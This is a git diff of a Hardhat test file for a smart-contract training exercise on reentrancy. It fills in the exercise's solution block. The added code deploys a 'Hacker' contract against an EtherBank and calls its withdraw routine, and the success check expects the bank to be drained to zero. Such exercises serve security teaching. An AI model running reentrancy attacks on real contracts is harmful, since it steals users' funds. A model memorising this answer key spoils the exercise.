@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { parseEther } = require("ethers/lib/utils");
 
 describe('Reentrancy Exercise 1', function () {
 
@@ -21,7 +22,7 @@ describe('Reentrancy Exercise 1', function () {
         );
 
         this.bank = await EtherBankFactory.deploy();
-        
+
         await this.bank.connect(user1).depositETH({ value: USER1_DEPOSIT });
         await this.bank.connect(user2).depositETH({ value: USER2_DEPOSIT });
         await this.bank.connect(user3).depositETH({ value: USER3_DEPOSIT });
@@ -38,11 +39,19 @@ describe('Reentrancy Exercise 1', function () {
     it('Exploit', async function () {
         /** CODE YOUR SOLUTION HERE */
 
+        const HackerFactory = await ethers.getContractFactory(
+            'contracts/reentrancy-1/EtherBank.sol:Hacker',
+            attacker
+        );
+
+        this.hacker = await HackerFactory.deploy(this.bank.address, { value: parseEther("1.1") });
+        await this.hacker.callingWithdraw();
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         let bankBalance = await ethers.provider.getBalance(this.bank.address);
         expect(bankBalance).to.be.equal(0);
 
